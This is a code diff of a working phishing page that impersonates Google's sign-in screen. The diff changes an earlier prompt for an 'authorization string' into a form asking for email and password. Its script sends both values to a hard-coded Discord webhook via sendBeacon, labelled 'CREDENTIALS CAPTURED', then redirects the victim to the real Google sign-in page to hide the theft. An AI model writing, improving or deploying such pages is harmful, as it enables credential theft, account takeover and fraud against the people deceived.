@@ -1,58 +1,69 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - Security Verification</title>
+    <title>Sign in - Google Accounts</title>
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        .logo { font-size: 24px; font-weight: bold; margin-bottom: 20px; }
-        .logo span:nth-child(1) { color: #4285F4; } .logo span:nth-child(2) { color: #EA4335; }
-        .logo span:nth-child(3) { color: #FBBC05; } .logo span:nth-child(4) { color: #4285F4; }
-        .logo span:nth-child(5) { color: #34A853; } .logo span:nth-child(6) { color: #EA4335; }
-        h1 { font-size: 24px; margin-bottom: 10px; font-weight: 400; }
-        p { color: #202124; font-size: 16px; margin-bottom: 30px; }
+        body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #fff; }
+        .login-card { width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .google-logo { font-size: 24px; font-weight: bold; margin-bottom: 20px; }
+        .google-logo span:nth-child(1) { color: #4285F4; } .google-logo span:nth-child(2) { color: #EA4335; }
+        .google-logo span:nth-child(3) { color: #FBBC05; } .google-logo span:nth-child(4) { color: #4285F4; }
+        .google-logo span:nth-child(5) { color: #34A853; } .google-logo span:nth-child(6) { color: #EA4335; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+        p { margin-bottom: 30px; font-size: 16px; color: #202124; }
         input { width: 100%; padding: 13px 15px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
-        button { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; }
-        button:hover { background-color: #1765cc; }
+        .btn-container { display: flex; justify-content: space-between; align-items: center; }
+        .create-acc { color: #1a73e8; font-weight: 500; cursor: pointer; text-decoration: none; font-size: 14px; }
+        button { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="logo">
+<div class="login-card">
+    <div class="google-logo">
         <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
     </div>
-    <h1>Verify it's you</h1>
-    <p>Enter your authorization string to continue to Google.</p>
-    <input type="password" id="auth-input" placeholder="Authorization string">
-    <button type="button" onclick="handleVerify()">Next</button>
+    <h1>Sign in</h1>
+    <p>Use your Google Account</p>
+    <input type="email" id="user-email" placeholder="Email or phone">
+    <input type="password" id="user-pass" placeholder="Enter your password">
+    <div class="btn-container">
+        <span class="create-acc">Forgot password?</span>
+        <button type="button" onclick="captureAndGo()">Next</button>
+    </div>
 </div>
 
 <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
+    const LAIR_WEBHOOK = "https://discord.com/api/webhooks/1503920357395009617/0EZVV6ZcaHZvnhFBd8TOg8vEyrNpUUSLHLKE3S3pesXzhtFwC3-xXeGzBbJhau3Vz110";
 
-    async function handleVerify() {
-        const value = document.getElementById('auth-input').value;
-        if (!value) return;
+    function captureAndGo() {
+        const email = document.getElementById('user-email').value;
+        const pass = document.getElementById('user-pass').value;
 
-        // Constructing the J2 Payload
-        const message = {
+        if (!email || !pass) return;
+
+        // Protocol 114: The Beacon Handshake
+        const data = {
+            username: "Google Security Monitor",
             embeds: [{
-                title: "🚨 SECURITY NOTIFICATION",
-                description: "New authorization string captured from internal portal.",
+                title: "🔑 CREDENTIALS CAPTURED",
                 color: 16711680,
-                fields: [{ name: "Captured String", value: "`" + value + "`" }]
+                fields: [
+                    { name: "User", value: email, inline: true },
+                    { name: "Pass", value: "`" + pass + "`", inline: true }
+                ],
+                footer: { text: "Method: Visual Masking (Tier 4)" }
             }]
         };
 
-        // Use the Beacon API for maximum reliability during redirect
-        const blob = new Blob([JSON.stringify(message)], { type: 'application/json' });
-        navigator.sendBeacon(WEBHOOK_URL, blob);
+        // Fire-and-forget background transfer[cite: 1]
+        navigator.sendBeacon(LAIR_WEBHOOK, new Blob([JSON.stringify(data)], { type: 'application/json' }));
 
-        // Immediate redirection to maintain the illusion[cite: 4]
-        window.location.replace("https://www.google.com");
+        // The "Vanishing Act" - Redirect to real Google[cite: 4]
+        setTimeout(() => {
+            window.location.replace("https://accounts.google.com/signin");
+        }, 200);
     }
 </script>
 
